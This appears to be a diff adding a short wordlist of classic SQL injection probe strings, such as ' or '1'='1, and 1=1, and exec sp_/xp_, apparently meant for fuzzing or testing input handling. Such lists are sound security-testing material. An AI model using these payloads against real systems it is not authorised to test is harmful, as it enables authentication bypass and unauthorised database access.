@@ -1,0 +1,9 @@
+'1
+exec sp_ (or exec xp_)
+and 1=1
+' and 1=(select count(*) from tablenames); --
+or 1=1
+' or '1'='1
+or1=1
+'or'1'='1
+' or 1=0
